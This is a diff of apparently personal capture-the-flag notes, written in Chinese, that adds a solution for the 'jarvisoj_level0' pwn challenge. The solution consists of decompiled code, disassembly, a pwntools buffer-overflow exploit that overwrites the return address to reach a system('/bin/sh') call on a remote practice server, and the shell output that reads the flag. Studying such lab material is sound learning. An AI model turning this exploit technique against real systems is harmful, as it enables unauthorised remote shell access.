@@ -470,7 +470,7 @@ sh.sendline(payload)
 sh.interactive()
 ```
 
-## pwn1_sctf_2016
+## pwn1_sctf_2016 (fgets())
 
 ```
 [*] '/home/wuko233/Projects/pwn/pwn1_sctf_2016/pwn1_sctf_2016'
@@ -603,4 +603,100 @@ PS D:\B23\VSC\H5\koishi.521514.xyz> & "D:/Program Files/python/python.exe" d:/CT
 flag{87ce8c15-cb0e-4149-8980-f5ca1a9e1573}
 timeout: the monitored command dumped core
 [*] Got EOF while reading in interactive
+```
+
+## jarvisoj_level0 (read())
+
+```
+[*] '/home/wuko233/Projects/pwn/jarvisoj_level0/level0'
+    Arch:       amd64-64-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+```
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  write(1, "Hello, World\n", 0xDuLL);
+  return vulnerable_function(1LL);
+}
+
+size_t vulnerable_function()
+{
+  char buf[128]; // [rsp+0h] [rbp-80h] BYREF
+
+  return read(0, buf, 0x200uLL);
+}
+```
+
+注意到`read()`函数，可以溢出，`buf`缓冲区大小为128，64位程序，所以返回地址长度8。
+
+构建前半部分payload:
+
+```python
+payload = b'q'*(128 + 8)
+```
+
+注意到shellcode`callsystem`:
+
+```asm
+.text:0000000000400596 ; int callsystem()
+.text:0000000000400596                 public callsystem
+.text:0000000000400596 callsystem      proc near
+.text:0000000000400596 ; __unwind {
+.text:0000000000400596                 push    rbp
+.text:0000000000400597                 mov     rbp, rsp
+.text:000000000040059A                 mov     edi, offset command ; "/bin/sh"
+.text:000000000040059F                 call    _system
+.text:00000000004005A4                 pop     rbp
+.text:00000000004005A5                 retn
+.text:00000000004005A5 ; } // starts at 400596
+.text:00000000004005A5 callsystem      endp
+```
+
+地址为`40059A`，所以后半部分为：
+
+```python
+payload += p64(0x40059A)
+```
+
+完整：
+
+```python
+from pwn import *
+
+host = "node5.buuoj.cn"
+port = 25201
+
+sh = remote(host, port)
+
+payload = b'q'*(128 + 8)
+payload += p64(0x40059A)
+sh.sendline(payload)
+sh.interactive()
+```
+
+```bash
+PS C:\Users\root> & "D:/Program Files/python/python.exe" //wsl.localhost/Debian/home/wuko233/Projects/pwn/jarvisoj_level0/hack.py
+[x] Opening connection to node5.buuoj.cn on port 25201
+[x] Opening connection to node5.buuoj.cn on port 25201: Trying 117.21.200.176
+[+] Opening connection to node5.buuoj.cn on port 25201: Done
+[*] Switching to interactive mode
+Hello, World
+ls
+bin
+boot
+dev
+etc
+flag
+flag.txt
+...
+tmp
+usr
+var
+cat flag.txt
+flag{ab0c2d86-23b2-4460-b29f-a7d2975812d6}
 ```
